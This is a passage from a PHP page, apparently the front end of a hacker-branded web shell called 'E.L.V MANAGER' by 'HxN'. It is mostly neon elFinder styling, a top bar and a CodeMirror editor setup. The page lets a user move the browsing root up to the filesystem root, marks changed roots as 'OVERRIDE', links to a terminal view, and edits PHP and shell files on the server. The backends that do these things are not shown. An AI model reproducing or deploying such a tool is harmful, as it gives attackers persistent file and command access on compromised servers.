  background-image:url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64' fill='none'><path d='M14 8h26l14 14v38a2 2 0 0 1-2 2H14a2 2 0 0 1-2-2V10a2 2 0 0 1 2-2z' fill='%23ff3366' fill-opacity='0.15' stroke='%23ff3366' stroke-width='2.5' stroke-linejoin='round'/><path d='M40 8v14h14' stroke='%23ff3366' stroke-width='2.5' stroke-linejoin='round'/><text x='32' y='48' font-family='Arial' font-size='14' font-weight='bold' fill='%23ff3366' text-anchor='middle'>PDF</text></svg>") !important;
  filter:drop-shadow(0 0 8px rgba(255,51,102,0.5)) !important;
}

/* Hover state — glow lebih kuat */
.elfinder-cwd-file.ui-state-hover .elfinder-cwd-icon-directory{
  filter:drop-shadow(0 0 14px rgba(255,176,46,0.9)) !important;
}
.elfinder-cwd-file.ui-state-hover .elfinder-cwd-icon-application,
.elfinder-cwd-file.ui-state-hover .elfinder-cwd-icon-text,
.elfinder-cwd-file.ui-state-hover .elfinder-cwd-icon-x-php{
  filter:drop-shadow(0 0 14px rgba(0,240,255,0.9)) !important;
}
.elfinder-cwd-file.ui-state-hover .elfinder-cwd-icon-archive{
  filter:drop-shadow(0 0 14px rgba(0,255,157,0.9)) !important;
}
.elfinder-cwd-file.ui-state-hover .elfinder-cwd-icon-audio,
.elfinder-cwd-file.ui-state-hover .elfinder-cwd-icon-video{
  filter:drop-shadow(0 0 14px rgba(255,0,229,0.9)) !important;
}

/* Selected state — magenta glow + slight scale */
.elfinder-cwd-file.ui-selected .elfinder-cwd-icon,
.elfinder-cwd-file.ui-selecting .elfinder-cwd-icon{
  filter:drop-shadow(0 0 14px rgba(255,0,229,0.9)) brightness(1.1) !important;
  transform:scale(1.05);
  transition:transform .2s ease;
}
.elfinder-cwd-file.ui-selected .elfinder-cwd-icon-image{
  filter:none !important;
  border-color:var(--magenta) !important;
  box-shadow:0 0 14px rgba(255,0,229,0.7) !important;
}

/* Hide checkbox — all selectors */
.elfinder-cwd-file input[type="checkbox"],
.elfinder-cwd-file .elfinder-cwd-checkbox,
.elfinder-cwd-file .ui-checkboxradio,
.elfinder-cwd-file .ui-checkboxradio-label,
.elfinder-cwd-file .ui-checkboxradio-icon,
.elfinder-cwd-view-icons .elfinder-cwd-file .ui-checkboxradio-icon,
.elfinder-cwd-view-icons .elfinder-cwd-file .elfinder-cwd-file-checkbox,
.elfinder-cwd-view-icons .elfinder-cwd-file .elfinder-cwd-selectbox{
  display:none !important;
  visibility:hidden !important;
  opacity:0 !important;
  width:0 !important;
  height:0 !important;
}

/* ===== STATUS BAR ===== */
.elfinder-statusbar{background:var(--surface) !important;border-top:1px solid var(--border) !important;color:var(--text-dim) !important;padding:6px 12px !important;font-size:11px !important;letter-spacing:.5px !important}
.elfinder-statusbar a{color:var(--cyan) !important}

/* ===== SCROLLBAR ===== */
.elfinder ::-webkit-scrollbar{width:9px;height:9px}
.elfinder ::-webkit-scrollbar-track{background:transparent}
.elfinder ::-webkit-scrollbar-thumb{background:linear-gradient(180deg,var(--cyan-dim),var(--magenta-dim));border-radius:5px;border:2px solid var(--bg2)}
.elfinder ::-webkit-scrollbar-thumb:hover{background:linear-gradient(180deg,var(--cyan),var(--magenta))}

/* ===== DIALOG ===== */
.elfinder-dialog{background:var(--surface) !important;border:1px solid var(--border-lit) !important;border-radius:4px !important;box-shadow:0 0 30px rgba(0,0,0,0.7), 0 0 60px rgba(0,240,255,0.08) !important;color:var(--text) !important}
.elfinder-dialog-titlebar{background:linear-gradient(90deg, rgba(0,240,255,0.12) 0%, rgba(255,0,229,0.12) 100%) !important;border-bottom:1px solid var(--border) !important;color:var(--cyan) !important;font-family:'Rajdhani',sans-serif !important;font-weight:600 !important;letter-spacing:2px !important;text-transform:uppercase !important;font-size:12px !important;padding:10px 14px !important}
.elfinder-dialog .ui-dialog-content{background:var(--surface) !important;color:var(--text) !important}
.elfinder-dialog .ui-dialog-buttonpane{background:var(--surface2) !important;border-top:1px solid var(--border) !important;padding:10px 14px !important}
.elfinder-dialog .ui-dialog-buttonpane button{background:rgba(0,240,255,0.08) !important;border:1px solid rgba(0,240,255,0.35) !important;color:var(--cyan) !important;font-family:'Rajdhani',sans-serif !important;font-weight:600 !important;letter-spacing:2px !important;text-transform:uppercase !important;padding:7px 16px !important;border-radius:2px !important;transition:all .2s ease !important}
.elfinder-dialog .ui-dialog-buttonpane button:hover{border-color:var(--magenta) !important;color:#fff !important;background:rgba(255,0,229,0.12) !important;box-shadow:0 0 12px rgba(255,0,229,0.4) !important}
.elfinder input[type="text"], .elfinder textarea, .elfinder select{background:var(--bg) !important;border:1px solid var(--border-lit) !important;color:var(--cyan) !important;font-family:'Share Tech Mono',monospace !important;font-size:13px !important;padding:8px 10px !important;border-radius:2px !important;outline:none !important}
.elfinder input:focus, .elfinder textarea:focus, .elfinder select:focus{border-color:var(--cyan) !important;box-shadow:0 0 10px rgba(0,240,255,0.3) !important}

/* ===== TOAST & CONTEXT MENU ===== */
.elfinder-toast, .elfinder-notify{background:var(--surface2) !important;border:1px solid var(--border-lit) !important;border-left:2px solid var(--cyan) !important;color:var(--text) !important;border-radius:3px !important;box-shadow:0 0 20px rgba(0,0,0,0.6) !important}
.elfinder-contextmenu{background:var(--surface2) !important;border:1px solid var(--border-lit) !important;border-radius:3px !important;box-shadow:0 0 20px rgba(0,0,0,0.7) !important;padding:4px !important}
.elfinder-contextmenu .ui-state-hover{background:rgba(0,240,255,0.1) !important;border-color:transparent !important;color:#fff !important}
.elfinder-contextmenu-item{color:var(--text) !important;font-size:12px !important;letter-spacing:.3px !important}

/* ===== CODEMIRROR ===== */
.CodeMirror{background:var(--bg) !important;color:var(--text) !important;border:1px solid var(--border) !important;font-family:'Share Tech Mono',monospace !important;font-size:13px !important}
</style>
</head>
<body>
<div id="app">

  <!-- TOP BAR -->
  <div class="elv-top">
    <div class="elv-brand">
      <span class="b1">E.L.V</span>
      <span class="b2">MANAGER</span>
      <span class="b3" title="❤">HxN</span>
    </div>

    <div class="elv-path" title="<?php echo htmlspecialchars($ELV_ROOT); ?>">
      <span class="p"><?php echo htmlspecialchars($ELV_ROOT); ?></span>
      <?php if ($elv_is_override): ?>
        <span class="badge">OVERRIDE</span>
      <?php endif; ?>
    </div>

    <?php if ($elv_has_parent): ?>
      <a class="elv-btn" href="<?php echo htmlspecialchars($elv_self); ?>?elv_set_root=<?php echo urlencode($elv_parent); ?>"
         title="Naik ke: <?php echo htmlspecialchars($elv_parent); ?>">
        <span class="ico">⬆</span><span class="lbl">PARENT</span>
      </a>
    <?php else: ?>
      <button class="elv-btn" disabled title="Sudah di root filesystem">
        <span class="ico">⬆</span><span class="lbl">PARENT</span>
      </button>
    <?php endif; ?>

    <?php if ($elv_is_override): ?>
      <a class="elv-btn magenta" href="<?php echo htmlspecialchars($elv_self); ?>?elv_set_root=reset"
         title="Kembali ke root awal">
        <span class="ico">⌂</span><span class="lbl">RESET</span>
      </a>
    <?php endif; ?>

    <a class="elv-btn green" href="<?php echo htmlspecialchars(elv_url(array('elv_view' => 'terminal'))); ?>" title="Buka Terminal">
      <span class="ico">▶_</span><span class="lbl">TERMINAL</span>
    </a>

    <a class="elv-btn" href="<?php echo htmlspecialchars(elv_url(array('elv_action' => 'logout', 'nonce' => $elv_nonce))); ?>">
      <span class="ico">⏻</span><span class="lbl">LOGOUT</span>
    </a>
  </div>

  <!-- MAIN AREA -->
  <div id="main">
    <div id="elfinder"></div>
  </div>

  <!-- CREDIT BAR -->
  <div class="elv-credit">
    <span class="who">marker</span>
    <span class="dot">·</span>
    <span class="by">by <b>HxN</b> for <b>E.L.V</b></span>
    <span class="dot">·</span>
    <span class="ver">v1.0.0</span>
  </div>

</div>

<script src="<?php echo htmlspecialchars($ELV['jquery_cdn']); ?>"></script>
<script src="<?php echo htmlspecialchars($ELV['jquery_ui_js']); ?>"></script>
<script src="<?php echo htmlspecialchars($ELV['elfinder_cdn']); ?>js/elfinder.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['elfinder_cdn']); ?>js/i18n/elfinder.<?php echo htmlspecialchars($elv_locale); ?>.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>lib/codemirror.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/clike/clike.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/xml/xml.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/javascript/javascript.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/css/css.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/htmlmixed/htmlmixed.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/php/php.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/sql/sql.min.js"></script>
<script src="<?php echo htmlspecialchars($ELV['codemirror_cdn']); ?>mode/markdown/markdown.min.js"></script>
<script>
jQuery(function($){
  $('#elfinder').elfinder({
    url: <?php echo json_encode($elv_self); ?>,
    lang: <?php echo json_encode($elv_locale); ?>,
    baseUrl: <?php echo json_encode($ELV['elfinder_cdn']); ?>,
    soundPath: <?php echo json_encode($ELV['elfinder_cdn'] . 'sounds/'); ?>,
    height: '100%',
    resizable: false,
    cssAutoLoad: false,
    customData: { elv_connector: 1 },
    commandsOptions: {
      edit: {
        mimes: [],
        editors: [{
          info: { id: 'codemirror', name: 'CodeMirror', canMakeEmpty: true },
          mimes: [
            'text/plain','text/html','text/css','text/javascript','application/javascript',
            'text/x-php','application/x-php','application/x-httpd-php',
            'text/xml','application/xml','application/xhtml+xml',
            'text/x-sql','text/x-markdown','text/x-c','text/x-csrc','text/x-c++',
            'text/x-c++src','text/x-java','application/json','text/x-shellscript',
            'text/x-python','text/x-ruby','text/x-perl','application/x-sh','text/x-sh'
          ],
          load: function(textarea) {
            var modeMap = {
              'text/x-php':'php','application/x-php':'php','application/x-httpd-php':'php',
              'text/html':'htmlmixed','application/xhtml+xml':'htmlmixed',
              'text/css':'css',
              'text/javascript':'javascript','application/javascript':'javascript','application/json':'javascript',
              'text/xml':'xml','application/xml':'xml',
              'text/x-sql':'sql',
              'text/x-markdown':'markdown',
              'text/x-c':'clike','text/x-csrc':'clike','text/x-c++':'clike','text/x-c++src':'clike','text/x-java':'clike',
              'text/x-shellscript':'shell','application/x-sh':'shell','text/x-sh':'shell',
              'text/x-python':'python','text/x-ruby':'ruby','text/x-perl':'perl'
            };
            var mode = modeMap[this.file.mime] || null;
            return CodeMirror.fromTextArea(textarea, {
              mode: mode, indentUnit: 4, lineNumbers: true, lineWrapping: true,
              theme: 'monokai', viewportMargin: Infinity
            });
          },
          close: function(textarea, instance) {},
          save: function(textarea, editor) {
            jQuery(textarea).val(editor.getValue());
          }
        }]
      }
    }
  });
});
</script>
</body>
</html>